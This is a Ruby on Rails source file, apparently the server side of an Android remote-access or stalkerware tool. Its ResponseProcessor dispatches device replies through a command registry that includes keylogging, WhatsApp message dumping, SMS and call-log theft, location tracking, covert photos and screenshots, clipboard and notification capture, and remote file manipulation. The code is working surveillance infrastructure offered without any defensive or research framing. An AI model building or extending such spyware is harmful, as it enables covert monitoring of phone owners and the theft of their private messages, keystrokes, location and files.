# frozen_string_literal: true

# Central dispatch hub for all device responses.
#
# When an Android device sends a response (via ActionCable or REST), this class:
#   1. Extracts the payload from one of three possible envelope formats
#      (data['payload'], data['data'], or the root hash itself).
#   2. Routes heartbeats directly to HeartbeatMonitor (bypasses PendingCommand
#      lookup since heartbeats are high-frequency and have no associated command).
#   3. For all other responses, looks up the PendingCommand by request_id and
#      delegates to a specialized processor class via the COMMAND_PROCESSORS registry.
#   4. Marks the PendingCommand as failed if the command type has no registered
#      processor or if an exception occurs during processing.
class ResponseProcessor
  # Registry mapping command type strings to their processor classes.
  # Each processor must implement .new(pending_command, payload) and #process.
  COMMAND_PROCESSORS = {
    'get_contacts' => ContactsResponseProcessor,
    'get_call_logs' => CalllogsResponseProcessor,
    'get_location' => LocationResponseProcessor,
    'get_device_info' => DeviceinfoResponseProcessor,
    'get_sms' => SmsResponseProcessor,
    'take_screenshot' => ScreenshotResponseProcessor,
    'take_photo' => PhotoResponseProcessor,
    'get_installed_apps' => AppsResponseProcessor,
    'dump_whatsapp_messages' => WhatsAppResponseProcessor,
    'keylog' => KeylogResponseProcessor,
    'list_installed_apps' => InstalledAppsResponseProcessor,
    'list_files' => FileBrowserResponseProcessor,
    'download_file' => FileBrowserResponseProcessor,
    'upload_file' => FileBrowserResponseProcessor,
    'upload_file_chunk' => FileBrowserResponseProcessor,
    'delete_file' => FileBrowserResponseProcessor,
    'preview_file' => FileBrowserResponseProcessor,
    'rename_file' => FileBrowserResponseProcessor,
    'move_file' => FileBrowserResponseProcessor,
    'search_files' => FileBrowserResponseProcessor,
    'geofence_event' => GeofenceResponseProcessor,
    'get_bookmarks' => DataCollectionResponseProcessor,
    'get_certificates' => DataCollectionResponseProcessor,
    'get_wifi_networks' => DataCollectionResponseProcessor,
    'get_clipboard_history' => DataCollectionResponseProcessor,
    'take_on_demand_screenshot' => DataCollectionResponseProcessor,
    'get_notifications' => DataCollectionResponseProcessor
  }.freeze

  # Main entry point. Accepts a Hash from ActionCable or a controller.
  # The payload may be wrapped in 'payload' or 'data' keys depending on
  # whether it comes from CommandChannel, the REST ack endpoint, or a
  # direct WebSocket message — hence the triple fallback extraction.
  #
  # +device_id+ — the authenticated device_id of the responding device.
  # Used to verify the response belongs to the device the command was sent to.
  def self.process(data, device_id: nil)
    return unless data.is_a?(Hash)
    
    # Normalize: devices may wrap the payload under different keys
    payload = data['payload'] || data['data'] || data
    
    # Handle heartbeat without requiring PendingCommand
    if payload['type'] == 'heartbeat' || payload['command'] == 'heartbeat'
      process_heartbeat(payload)
      return
    end
    
    request_id = payload['request_id'] || payload['command_id']
    
    return Rails.logger.warn("[ResponseProcessor] No request_id/command_id found in payload") unless request_id
    
    # Look up PendingCommand using request_id
    pending_command = PendingCommand.find_by(request_id: request_id)
    return Rails.logger.warn("[ResponseProcessor] PendingCommand not found for request_id: #{request_id}") unless pending_command

    # Cross-device verification: ensure the responding device owns this command
    if device_id.present? && pending_command.smartphone&.device_id != device_id
      Rails.logger.warn("[ResponseProcessor] Cross-device response blocked: device '#{device_id}' " \
                        "attempted to complete command for device '#{pending_command.smartphone&.device_id}' " \
                        "(request_id: #{request_id})")
      return
    end
    
    # Idempotency guard: skip if already completed/failed/timed-out (race between ActionCable and HTTP paths)
    unless pending_command.pending? || pending_command.processing?
      Rails.logger.info "[ResponseProcessor] Skipping already-#{pending_command.status} command for request_id: #{request_id}"
      return
    end

    Rails.logger.info "[ResponseProcessor] Processing command '#{pending_command.command}' for request_id: #{request_id}"
    
    # Get the appropriate processor class based on command type
    processor_class = COMMAND_PROCESSORS[pending_command.command]
    
    unless processor_class
      error_msg = "Unknown command type: #{pending_command.command}"
      Rails.logger.error "[ResponseProcessor] #{error_msg}"
      pending_command.mark_failed(error_msg)
      return
    end
    
    # Instantiate and process
    processor = processor_class.new(pending_command, payload)
    processor.process
    
    Rails.logger.info "[ResponseProcessor] Successfully processed '#{pending_command.command}' for request_id: #{request_id}"
  rescue StandardError => e
    Rails.logger.error "[ResponseProcessor] Error processing request_id #{request_id}: #{e.message}"
    Rails.logger.error e.backtrace.join("\n")
    
    # Attempt to mark the pending command as failed if we have one
    pending_command&.mark_failed(e.message) if pending_command
  end

  private

  # Heartbeats are processed separately from commands because they are
  # sent frequently (~every 15 s) and never have a corresponding PendingCommand.
  # Updates are written to Redis (not PostgreSQL) to avoid write amplification.
  def self.process_heartbeat(payload)
    device_id = payload['device_id']
    
    return Rails.logger.warn("[ResponseProcessor] No device_id in heartbeat payload") unless device_id.present?
    
    # Find the smartphone
    smartphone = Smartphone.find_by(device_id: device_id)
    unless smartphone
      Rails.logger.warn("[ResponseProcessor] Smartphone not found for device_id: #{device_id}")
      return
    end
    
    # Update heartbeat in Redis
    metadata = {
      battery_level: payload['battery_level'],
      connectivity: payload['connectivity'],
      timestamp: Time.current.to_i
    }
    
    HeartbeatMonitor.process_heartbeat(device_id, metadata)
    
    Rails.logger.info "[ResponseProcessor] Processed heartbeat for device #{device_id} (#{smartphone.name})"
  rescue StandardError => e
    Rails.logger.error "[ResponseProcessor] Error processing heartbeat: #{e.message}"
    Rails.logger.error e.backtrace.join("\n")
  end
end